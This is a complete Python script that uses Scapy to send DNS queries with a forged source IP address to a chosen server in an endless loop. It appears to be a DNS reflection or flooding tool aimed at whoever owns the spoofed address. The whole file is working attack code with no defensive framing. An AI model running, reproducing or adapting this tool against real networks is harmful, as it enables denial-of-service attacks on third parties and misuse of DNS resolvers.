#!/usr/bin/env python3

from scapy.all import IP, UDP, DNS, DNSQR, send, conf, RandShort
import sys


def send_dns_query(query_name, type, source_ip, target_ip, target_port=53):
    
    conf.L3socket = conf.L3socket
    packet = IP(src=source_ip, dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=type))
    send(packet)

while True:
    send_dns_query(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])

